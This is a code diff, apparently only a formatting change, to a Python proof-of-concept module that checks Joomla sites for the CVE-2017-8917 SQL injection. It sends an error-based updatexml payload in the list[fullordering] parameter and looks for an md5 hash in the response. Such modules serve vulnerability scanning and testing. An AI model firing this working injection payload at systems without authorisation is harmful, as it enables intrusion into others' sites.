@@ -34,9 +34,11 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917
-            payload = {'option':'com_fields','view':'fields','layout':'modal','list[fullordering]':'updatexml(0x3a,concat(1,(select md5(1))),1)'}
-            request = requests.get('{target}'.format(target=self.target), params=payload)
+            # https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917
+            payload = {'option': 'com_fields', 'view': 'fields', 'layout': 'modal',
+                       'list[fullordering]': 'updatexml(0x3a,concat(1,(select md5(1))),1)'}
+            request = requests.get('{target}'.format(
+                target=self.target), params=payload)
             r = request.text
             if 'c4ca4238a0b923820dcc509a6f75849b' in r:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
